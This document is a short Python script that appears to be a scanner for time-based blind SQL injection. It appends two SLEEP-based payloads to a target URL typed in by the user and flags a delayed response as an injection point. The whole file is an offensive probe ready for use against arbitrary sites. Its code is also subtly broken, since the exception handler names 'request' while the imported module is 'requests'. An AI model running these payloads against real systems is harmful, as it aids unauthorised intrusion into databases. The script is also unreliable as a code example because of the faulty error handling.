import requests
import time

payloads = [
    "' OR IF(1=1,SLEEP(5),0)--",
    "' OR IF(1=2,SLEEP(5),0)--"
]

def scan(url):
    print(f"[*] Scanning {url} for Time-Based Blind SQLi")
    for payload in payloads:
        new_url = url + payload
        try:
            start = time.time()
            requests.get(new_url, timeout=10)
            elapsed = time.time() - start


            if elapsed > 4:
                print("[!] Possible Time-Based Blind SQL Injection Found")
                print(f"URL: {new_url}")
                print(f"Payload: {payload}")
                return

        except request.exceptions.RequestException:
            pass

    print("[-] No Time-Based Blind SQLi Detected")

if __name__ == "__main__":
    target = input("Enter Target URL (with parameter): ")
    scan(target)
